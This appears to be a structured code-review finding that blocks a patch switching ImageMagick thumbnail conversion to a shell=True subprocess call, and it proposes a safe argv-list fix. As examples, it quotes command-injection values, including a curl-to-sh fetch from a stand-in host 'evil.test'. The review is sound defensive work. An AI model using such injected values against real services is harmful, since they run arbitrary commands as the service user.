findings.body:
Switching to `shell=True` with an f-string interpolates `upload_dir`, `name`, and `oid` into a shell command. Any metacharacter in those values is executed by the shell — e.g. `name="img.png; id > /tmp/pwned"` or `oid="x\$(curl evil.test)"` runs arbitrary commands as the service user.

ImageMagick policy delegates are enforced inside the `convert`/`magick` binary and do not require a shell. Restore argv-list form (and keep the absolute binary path):

```suggestion
    subprocess.run(
        ["/usr/bin/convert", f"{upload_dir}/{name}", f"/srv/thumbs/{oid}.png"],
        check=True,
    )
```

If IM7 needs the `magick` frontend, use `["/usr/bin/magick", "convert", src, dst]` the same way — still `shell=False`.

summary:
## Verdict

**Do not merge** — this change introduces a critical command-injection vulnerability by switching thumbnail conversion to `subprocess.run(..., shell=True)` with unquoted interpolation of `upload_dir`, `name`, and `oid`.

## Analysis

`make_thumb` builds a shell command via an f-string:

```python
f"convert {upload_dir}/{name} /srv/thumbs/{oid}.png"
```

Any shell metacharacter in those values (`;`, `|`, `\$()`, backticks, whitespace, etc.) is interpreted by the shell. A crafted `name` such as `x; curl evil.test | sh` or an `oid` containing `$(...)` runs arbitrary commands as the service user. The previous argv-list form (`["/usr/bin/convert", src, dst]`) avoided that class of bug entirely.

The rationale in the new comment ("shell form needed for the imagemagick policy delegate") does not hold: ImageMagick reads `policy.xml` and resolves delegates inside the `convert` binary whether it is started via `execve` or a shell. Policy configuration is independent of how the process is spawned.

Side effects of the same hunk:
- Drops the absolute path `/usr/bin/convert` for a bare `convert` (PATH hijack risk under `shell=True`).
- Removes the note that `name` was validated upstream — even with a strict allowlist, shell interpolation remains the wrong boundary.

## Safe direction

Keep the argv list (or `shell=False`). If IM7 needs a different binary or argv shape, call `/usr/bin/convert` or `/usr/bin/magick` with explicit arguments, and pass paths as separate list elements. If a shell were ever unavoidable, every dynamic segment would need `shlex.quote` — still inferior to argv form.

**Recommendation:** request-changes

verification.reason: The patch replaces a safe argv-list `subprocess.run` with `shell=True` and an f-string that interpolates `upload_dir`, `name`, and `oid`, so shell metacharacters in those values execute as the service user. Base used a non-shell argv form; no in-repo validation of those parameters remains.
